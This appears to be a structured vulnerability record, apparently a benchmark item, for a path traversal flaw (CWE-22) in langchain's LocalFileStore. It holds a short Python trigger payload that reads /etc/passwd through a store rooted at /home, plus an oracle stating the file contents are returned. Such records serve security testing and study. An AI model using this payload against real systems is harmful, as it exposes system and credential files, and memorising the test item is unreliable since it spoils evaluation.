title: LocalFileStore allows path traversal to read/write arbitrary files due to insufficient path validation
cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
trigger_payload:
from langchain.storage import LocalFileStore
file_store = LocalFileStore("/home")
value = file_store.mget(["/etc/passwd"])
print(value)
oracle: The server returns the contents of /etc/passwd as a response, demonstrating file read access.
